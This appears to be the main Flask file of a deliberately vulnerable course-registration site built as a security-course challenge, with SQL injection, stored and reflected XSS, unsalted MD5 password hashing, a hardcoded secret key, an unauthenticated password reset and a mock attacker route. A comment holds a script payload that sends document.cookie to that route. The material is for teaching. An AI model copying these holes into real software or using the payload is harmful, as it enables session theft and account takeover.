from flask import Flask, request, session, render_template, redirect, url_for, make_response
import psycopg2
from forms.home import Login
from forms.home import Register
from cruds.crud import CrudUser
import hashlib
import helper
import sys

app = Flask(__name__)
app.config['SECRET_KEY'] = 'comp6841extension'

if len(sys.argv) != 2:
    print("usage: python3 app.py <port>")
    exit(1)

# Connect to the database
conn = psycopg2.connect(database="comp6841db", user="postgres",
                        password="postgres", host="localhost", port=sys.argv[1])

crud_user = CrudUser(conn)

@app.route("/", methods=['POST','GET'])
def homepage():
    f = Login()
    if request.method == 'POST':
        username = f.username.data
        pw = f.password.data
        md5_hash = hashlib.md5()
        # Update the hash object with the bytes of the input string
        md5_hash.update(pw.encode())

        # Get the full hexadecimal representation of the hash
        pw_hashed = md5_hash.hexdigest()
        query_res = crud_user.searchUser(username, pw_hashed)

        # print("query_res = ", query_res)

        if query_res[1]:
            return render_template("index.html", entries = query_res[0][0], form = f, error = None)
        
        res = query_res[0]
        if len(res) > 1:
            # check if database name is in the result
            for each_pair in res:
                if each_pair[0] == 'comp6841db' or each_pair[1] == 'comp6841db':
                    # should only  
                    return render_template("index.html", entries = each_pair, form = f, error = None)
            
            return render_template("solvedChallenge/challenge1.html", dummy_usernames = ["This is some dummy usernames"\
                                                                                         , "to help u understand"\
                                                                                            , "SQL injection"])
        elif len(res) == 1:
            if helper.check_topsecret_solved(res):
                return render_template("solvedChallenge/challenge4.html")
            
            session['user_info'] = res[0]
            resp = make_response(redirect(url_for('userDashboard')))
            resp.set_cookie('login_user', f'{res[0]}')
            # return redirect(url_for('userDashboard'))   
            return resp         
        else:
            # incorrect credentials
            return render_template("index.html", form = f, error = "Incorrect credentials")
        
    return render_template("index.html", form = f, error = None)

@app.route("/register", methods=['POST', 'GET'])
def register():
    f = Register()
    if request.method == 'POST':
        print("post")
        # if f.validate_on_submit():
        new_email = f.email.data
        new_username = f.create_username.data
        new_pw = f.create_password.data

        md5_hash = hashlib.md5()

        # Update the hash object with the bytes of the input string
        md5_hash.update(new_pw.encode())

        # Get the full hexadecimal representation of the hash
        pw_hashed = md5_hash.hexdigest()

        print(f"[DEBUG]: {new_email}, {new_username}, {pw_hashed}")
        crud_user.addUser(new_username, new_email, pw_hashed)
        return redirect(url_for('homepage'))
    
    return render_template("register.html", form = f)

@app.route('/dashboard', methods=['GET'])
def userDashboard():
    user_info = session.get('user_info')
    if user_info:
        # normal log in
        print(f"username = {user_info[0]}")

        course_ls = session.get('all_course_list')
        if course_ls == None:
            print("first time get, store in session")
            course_ls = crud_user.getAllCourses()
            session['all_course_list'] = course_ls

        return render_template("user-dashboard.html", username = user_info[0], course_ls = course_ls)
    return redirect(url_for('homepage'))

# reflected XSS attack
@app.route('/user-profile', methods=['GET', 'POST'])
def userProfile():
    user_info = session.get('user_info')
    if user_info == None:
        return redirect(url_for('homepage'))
    
    all_courses = crud_user.searchAllCourseForUser(username = user_info[0])
    return render_template("user-profile.html"\
                           , course_list = all_courses, username = user_info[0])

@app.route('/view-course/<course_name>', methods=['GET', 'POST'])
def viewCourseDetail (course_name) :
    print(f"course_name = {course_name}")
    print("view course detail, method = ", request.method)
    # course_info = session.get(course_name)
    # if course_info == None:
    course_info =  crud_user.searchCourseByName(course_name=course_name)
    c_id = str(course_info['id'])
    all_comments = crud_user.selectAllCommentsByCourse(c_id)

    # print(f'course_info = {course_info}')
    if request.method == 'POST' and 'form_select_submit' in request.form:
        print("select form")
        user_info = session.get('user_info')
        course_completed = crud_user.searchAllCoursePassed(user_info[0])
        pre_requirements = crud_user.searchAllPrerequisites(course_name)

        # if not all course_completed are in pre_req:
        is_eligible = helper.check_list_containing(pre_requirements, course_completed)
        if is_eligible:
            # print(f"you are eligible for course {course_name}")
            return redirect(url_for('selectCourse', course_name = course_name))
        else:
            # stay on same page
            return render_template("course-detail.html", course = course_info, \
                                error = "you are not eligible for this course", comments = all_comments)
    elif request.method == 'POST' and 'form_comment' in request.form:
        print("comment form")
        single_comment =  request.form.get('comment')

        if len(single_comment ) > 0:
            print(f"insert comment {c_id}, {single_comment}")
            crud_user.insertCommentOnCourse(c_id, single_comment)

            if helper.check_finish_xss(single_comment):
                crud_user.remove_xss_comment(c_id, single_comment)
                return render_template("solvedChallenge/challenge3.html")
            
        return redirect(url_for('viewCourseDetail', course_name=course_name))
    
    elif request.method == 'POST' and 'form_question' in request.form:
        print("ask question")
        question = request.form.get('question')
        return redirect(url_for('confirmQuestion', q = question))
    
    # url_for: will give this!!!, course_info: name + description
    return render_template("course-detail.html", course = course_info, error = None,\
                            comments = crud_user.selectAllCommentsByCourse(c_id))

@app.route('/confirm-question-submit')
def confirmQuestion():
    q = request.args.get('q')
    return render_template("question-submit.html", q = q)

@app.route('/select-course/<course_name>', methods=['GET', 'POST'])
def selectCourse(course_name):
    # add the course to student's list
    user_info = session.get('user_info')
    if user_info == None:
        return redirect(url_for('homepage'))
    
    crud_user.addCourseToUser(course_name, user_info[0] )
    return redirect(url_for('userProfile'))

# normally, this is an external website 
# for simplicity, I just put the website here
@app.route('/i-am-bad/', methods=["GET", "POST"])
def eat_ur_cookie():
    print("I am bad!!")
    get_cookie = request.args.get("q") 
    print(f"cookie = {get_cookie}")
    # <script>document.location="http://127.0.0.1:5000/i-am-bad?q="%2Bdocument.cookie</script>
    return render_template("bad-xss.html", username = get_cookie)

@app.route("/reset-password", methods=['GET', 'POST'])
def reset_pw():
    if request.method == 'POST':
        user_email = request.form.get('email')
        password = request.form.get('new_password')
        confirm_password = request.form.get('confirm_password')

        if password == confirm_password:

            md5_hash = hashlib.md5()
            # Update the hash object with the bytes of the input string
            md5_hash.update(password.encode())

            # Get the full hexadecimal representation of the hash
            pw_hashed = md5_hash.hexdigest()
            crud_user.change_password(user_email, pw_hashed)
            return redirect(url_for('homepage'))
        
    return render_template("change-password.html")

if __name__ == '__main__':
    app.run(debug=True)